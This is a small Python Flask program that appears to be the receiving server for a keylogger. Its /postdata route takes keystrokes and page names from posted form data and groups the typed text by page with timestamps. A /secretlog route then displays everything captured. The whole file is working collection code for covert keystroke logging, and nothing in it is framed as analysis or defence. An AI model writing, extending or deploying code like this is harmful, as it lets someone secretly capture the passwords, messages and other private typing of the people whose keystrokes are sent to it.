from flask import Flask,abort, redirect, url_for,session,render_template
from flask import request
import datetime
app = Flask(__name__, static_url_path='/static')
xpage=""
text=""
final=[]
#pages=[]
@app.route('/')
def index():
    return "hi"

@app.route('/postdata',methods=['POST','GET'])
def login():
    global xpage
    global text
    global final
    data={}
    key=request.form["key"]
    page=request.form["page"]
    #print(len(key))
    #print(page,"\n",xpage,"\n\n\n")
    if page!=xpage or key==" (Enter) ":
        print(text,page)
        #final.append(text)
        #pages.append(page)
        data['text']=text
        data['page']=page
        data['time']=str(datetime.datetime.now())
        
        xpage=page       
        text=""
        final.append(data)
        print(final)
    text=text+key
    
    #print(key,"  ",page)
    #print()
    #print()
    return redirect(url_for('secretlog'))

@app.route('/secretlog')
def secretlog():
    print("IN secretlogOOO")
    return render_template("index.html",final=final)


if __name__ == '__main__':
    app.run(debug=True)